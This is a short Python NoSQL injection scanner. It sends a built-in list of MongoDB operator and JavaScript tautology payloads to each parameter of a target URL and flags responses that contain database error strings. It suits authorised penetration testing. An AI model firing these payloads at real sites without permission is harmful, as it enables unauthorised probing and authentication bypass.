import requests
import argparse
import json
import sys
from urllib.parse import urlparse, parse_qs, urlencode

# Common NoSQL error strings to look for
ERROR_SIGNATURES = [
    "not authorized on",
    "not allowed",
    "MongoError",
    "mongodb.driver",
    "Objectid",
    "syntax error",
    "unexpected token",
    "Expression is invalid",
    "error parsing query",
    "BadValue",
    "Failed to parse"
]

# Payloads for MongoDB/NoSQL injection
PAYLOADS = [
    {"$gt": ""},
    {"$ne": 1},
    {"$ne": "random_string_123"},
    {"$regex": ".*"},
    "admin' || '1'=='1",
    "' || 1==1//",
    "'; return true; //",
    "[$ne]=1",
    "[$gt]="
]

def log(msg, type="info"):
    colors = {"info": "[*]", "vuln": "[+]", "warn": "[!]"}
    prefix = colors.get(type, "[*]")
    print(f"{prefix} {msg}")

def check_vulnerability(url, method, data, is_json):
    """Sends a request and checks if the response indicates a vulnerability."""
    try:
        if method.upper() == "POST":
            if is_json:
                resp = requests.post(url, json=data, timeout=10)
            else:
                resp = requests.post(url, data=data, timeout=10)
        else:
            resp = requests.get(url, params=data, timeout=10)
        
        # Check for error signatures
        for sig in ERROR_SIGNATURES:
            if sig.lower() in resp.text.lower():
                return True, f"Error-based (Found signature: {sig})"
        
        # Simple boolean check could be added here by comparing with a base response
        
        return False, None
    except Exception as e:
        return False, None

def scan(target_url, method="GET", post_data=None):
    log(f"Starting NoSQLi scan on {target_url}...")
    
    parsed = urlparse(target_url)
    params = parse_qs(parsed.query)
    is_json = False
    
    # Prepare base data
    if method.upper() == "POST":
        if post_data:
            try:
                # Try to parse as JSON first
                params = json.loads(post_data)
                is_json = True
            except json.JSONDecodeError:
                # Fallback to URL encoded
                params = parse_qs(post_data)
                is_json = False
        else:
            params = {}

    # If it's a list (from parse_qs), simplify it for testing
    if isinstance(params, dict):
        for k in params:
            if isinstance(params[k], list) and len(params[k]) == 1:
                params[k] = params[k][0]

    if not params:
        log("No parameters found to test.", "warn")
        return

    for param in params:
        log(f"Testing parameter: '{param}'")
        for payload in PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            
            # Clean URL for GET requests (remove original query)
            base_url = target_url.split('?')[0] if method == "GET" else target_url
            
            is_vuln, reason = check_vulnerability(base_url, method, test_params, is_json)
            
            if is_vuln:
                log(f"VULNERABILITY FOUND!", "vuln")
                log(f"Parameter: {param}", "vuln")
                log(f"Payload: {json.dumps(payload)}", "vuln")
                log(f"Type: {reason}", "vuln")
                # We continue to find more if possible, or stop? Usually stop on first for simplicity.
                return

    log("Scan complete. No obvious vulnerabilities found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple NoSQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP Method")
    parser.add_argument("-d", "--data", help="POST data (JSON or URL encoded)")
    
    args = parser.parse_args()
    scan(args.url, args.method, args.data)
